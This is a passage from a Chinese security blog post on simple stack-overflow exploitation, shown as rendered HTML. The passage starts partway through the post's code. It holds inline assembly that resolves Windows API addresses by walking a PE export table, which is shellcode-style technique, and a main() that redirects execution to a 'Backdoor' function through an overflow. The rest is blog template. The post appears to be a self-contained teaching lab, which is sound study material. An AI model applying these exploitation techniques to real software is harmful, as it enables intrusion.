<span class="hljs-number">0</span><br>		call ExitProcessAddr<br>	&#125;<br>&#125;<br><br><span class="hljs-keyword">void</span> __declspec(naked)  <span class="hljs-built_in">GetApiAddr</span>() &#123;<br>	__asm &#123;<br>		push    ebp<br>		mov     ebp, esp<br>		add     esp, <span class="hljs-number">0F</span>FFFFFF8h<br>		push    ecx<br>		push    ebx<br>		push    edx<br>		push    esi<br>		push    edi<br>		mov[ebp - <span class="hljs-number">4</span>], <span class="hljs-number">0</span><br>		mov     esi, [ebp + <span class="hljs-number">0</span>Ch]<br>		mov     edx, esi<br>Continue_Searching_Null :<br>		cmp     byte ptr[esi], <span class="hljs-number">0</span><br>		jz      <span class="hljs-keyword">short</span> Got_The_Length<br>		inc     esi<br>		jmp     <span class="hljs-keyword">short</span> Continue_Searching_Null<br>Got_The_Length :<br>		inc     esi<br>		sub     esi, edx<br>		mov[ebp - <span class="hljs-number">8</span>], esi<br>		mov     esi, [ebp + <span class="hljs-number">8</span>]<br>		add     esi, [esi + <span class="hljs-number">3</span>Ch]<br>		mov     esi, [esi + <span class="hljs-number">78</span>h]<br>		add     esi, [ebp + <span class="hljs-number">8</span>]<br>		mov     ebx, [esi + <span class="hljs-number">20</span>h]<br>		add     ebx, [ebp + <span class="hljs-number">8</span>]<br>		<span class="hljs-keyword">xor</span> edx, edx<br>_Loop :<br>		push    esi<br>		mov     edi, [ebx]<br>		add     edi, [ebp + <span class="hljs-number">8</span>]<br>		mov     esi, [ebp + <span class="hljs-number">0</span>Ch]<br>		mov     ecx, [ebp - <span class="hljs-number">8</span>]<br>		cld<br>		repe cmpsb<br>		jnz     <span class="hljs-keyword">short</span> _Check_Zero<br>		pop     esi<br>		jmp     <span class="hljs-keyword">short</span> _Find_Index<br>_Check_Zero :<br>		pop     esi<br>		add     ebx, <span class="hljs-number">4</span><br>		inc     edx<br>		cmp     edx, [esi + <span class="hljs-number">18</span>h]<br>		jb      <span class="hljs-keyword">short</span> _Loop<br>		jmp     <span class="hljs-keyword">short</span> _Exit<br>_Find_Index :<br>		sub     ebx, [esi + <span class="hljs-number">20</span>h]<br>		sub     ebx, [ebp + <span class="hljs-number">8</span>]<br>		shr     ebx, <span class="hljs-number">1</span><br>		add     ebx, [esi + <span class="hljs-number">24</span>h]<br>		add     ebx, [ebp + <span class="hljs-number">8</span>]<br>		movzx   eax, word ptr[ebx]<br>		shl     eax, <span class="hljs-number">2</span><br>		add     eax, [esi + <span class="hljs-number">1</span>Ch]<br>		add     eax, [ebp + <span class="hljs-number">8</span>]<br>		mov     eax, [eax]<br>		add     eax, [ebp + <span class="hljs-number">8</span>]<br>		mov[ebp - <span class="hljs-number">4</span>], eax<br>_Exit :<br>		mov     eax, [ebp - <span class="hljs-number">4</span>]<br>		pop     edi<br>		pop     esi<br>		pop     edx<br>		pop     ebx<br>		pop     ecx<br>		leave<br>		retn    <span class="hljs-number">8</span><br>	&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hacker !!&quot;</span>);<br>	<span class="hljs-keyword">if</span> ((DWORD)Backdoor != <span class="hljs-number">0x004010C0</span>) &#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error BackDoor Addr %p&quot;</span>, Backdoor);<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br>	<span class="hljs-built_in">overflow</span>();<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>上述代码为简便我们直接自己开启一个后门，通过其来完成对应内容实现，我们可以成功的在各个操作系统下成功进行调用</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Malicious-Code-Analysis/" class="category-chain-item">Malicious Code Analysis</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>栈溢出的简单利用</div>
+      <div>https://equinox-shame.github.io/2023/06/07/栈溢出的简单利用/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>梓曰</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年6月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/06/06/Widnows%E5%86%85%E6%A0%B8%E5%AE%9E%E9%AA%8C%20%E2%80%94%20%E8%BF%9B%E7%A8%8B%E5%88%87%E6%8D%A2/" title="Windows内核实验 ——— 进程切换">
+                        <span class="hidden-mobile">Windows内核实验 ——— 进程切换</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"2aM6IUUWOeDGCZaDdRhrvLam-gzGzoHsz","appKey":"GQdXw2PjI9DScgw5QHVCZeYm","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"","emojiCDN":"//i0.hdslb.com/bfs/emote/","emojiMaps":{"脱单doge":"bf7e00ecab02171f8461ee8cf439c73db9797748.png","热":"4e58a2a6f5f1580ac33df2d2cf7ecad7d9ab3635.png","微笑":"685612eadc33f6bc233776c6241813385844f182.png","口罩":"3ad2f66b151496d2a5fb0a8ea75f32265d778dd3.png","doge":"3087d273a78ccaff4bb1e9972e2ba2a7583c9f11.png","妙啊":"b4cb77159d58614a9b787b91b1cd22a81f383535.png","OK":"4683fd9ffc925fa6423110979d7dcac5eda297f4.png","星星眼":"63c9d1a31c0da745b61cdb35e0ecb28635675db2.png","辣眼睛":"35d62c496d1e4ea9e091243fa812866f5fecc101.png","吃瓜":"4191ce3c44c2b3df8fd97c33f85d3ab15f4f3c84.png","滑稽":"d15121545a99ac46774f1f4465b895fe2d1411c3.png","呲牙":"b5a5898491944a4268360f2e7a84623149672eb6.png","打call":"431432c43da3ee5aab5b0e4f8931953e649e9975.png","歪嘴":"4384050fbab0586259acdd170b510fe262f08a17.png","调皮":"8290b7308325e3179d2154327c85640af1528617.png","翻白眼":"eba54707c7168925b18f6f8b1f48d532fe08c2b1.png","灵魂出窍":"43d3db7d97343c01b47e22cfabeca84b4251f35a.png","再见":"fc510306bae26c9aec7e287cdf201ded27b065b9.png","嗑瓜子":"28a91da1685d90124cfeead74622e1ebb417c0eb.png","笑哭":"c3043ba94babf824dea03ce500d0e73763bf4f40.png","藏狐":"ba0937ef6f3ccca85e2e0047e6263f3b4da37201.png","脸红":"0922c375da40e6b69002bd89b858572f424dcfca.png","给心心":"1597302b98827463f5b75c7cac1f29ea6ce572c4.png","嘟嘟":"abd7404537d8162720ccbba9e0a8cdf75547e07a.png","哦呼":"362bded07ea5434886271d23fa25f5d85d8af06c.png","喜欢":"8a10a4d73a89f665feff3d46ca56e83dc68f9eb8.png","酸了":"92b1c8cbceea3ae0e8e32253ea414783e8ba7806.png","嫌弃":"de4c0783aaa60ec03de0a2b90858927bfad7154b.png","大哭":"2caafee2e5db4db72104650d87810cc2c123fc86.png","害羞":"9d2ec4e1fbd6cb1b4d12d2bbbdd124ccb83ddfda.png","疑惑":"b7840db4b1f9f4726b7cb23c0972720c1698d661.png","喜极而泣":"485a7e0c01c2d70707daae53bee4a9e2e31ef1ed.png","奸笑":"bb84906573472f0a84cebad1e9000eb6164a6f5a.png","阴险":"ba8d5f8e7d136d59aab52c40fd3b8a43419eb03c.png","囧":"12e41d357a9807cc80ef1e1ed258127fcc791424.png","呆":"33ad6000d9f9f168a0976bc60937786f239e5d8c.png","大笑":"ca94ad1c7e6dac895eb5b33b7836b634c614d1c0.png","惊喜":"0afecaf3a3499479af946f29749e1a6c285b6f65.png"},"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://equinox-shame.github.io" target="_blank" rel="nofollow noopener"><span>梓曰</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
